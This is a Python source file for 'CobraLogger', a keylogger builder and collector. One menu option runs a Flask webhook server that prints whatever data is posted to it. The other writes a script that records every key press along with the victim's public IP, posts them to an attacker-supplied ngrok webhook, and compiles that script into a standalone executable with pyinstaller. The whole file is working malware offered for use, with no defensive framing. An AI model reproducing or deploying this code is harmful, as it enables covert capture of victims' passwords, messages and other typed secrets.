import os
from flask import Flask, request, abort
from colorama import Fore
import time

while True:
    os.system("title CobraLogger")
    os.system("cls")

    print(Fore.LIGHTGREEN_EX + ''' ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌          ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌          ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌       ▐░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀         ▀ 
                                                                    \n''')

    print(Fore.LIGHTGREEN_EX + "Log Keys[1] | Build Keylogger[2]")
    option = input(Fore.LIGHTGREEN_EX + ">> ")

    if option=="1":
        os.system("cls")
        app = Flask(__name__)

        @app.route("/webhook", methods=["POST"])
        def webhook():
            if request.method == "POST":
                print(request.data)
                return "success", 200
            else:
                abort(400)

        if __name__ == "__main__":
            app.run()

    elif option=="2":
        os.system("cls")

        ngrok_domain = input("Enter Static Ngrok Domain >> ")
        file_name = input("Enter File Name >> ")
        

        f = open(file_name + ".py", "a")
        f.write('''import requests
import keyboard

webhook_url = 'http://''' + ngrok_domain + '''/webhook'

ip = requests.get("https://api.ipify.org")

def on_key_press(event):
        data = {
            "ip": ip.text,
            "key": event.name
        }

        r = requests.post(webhook_url, data=data,  headers={"Content-Type": "applications/json"})

keyboard.on_press(on_key_press)

keyboard.wait()''')
        f.close()

        os.system("pyinstaller --onefile " + file_name + ".py")
        print("Keylogger Has now been built!")
        time.sleep(4)

    else:
        print(Fore.RED + "Error!")
        time.sleep(2)

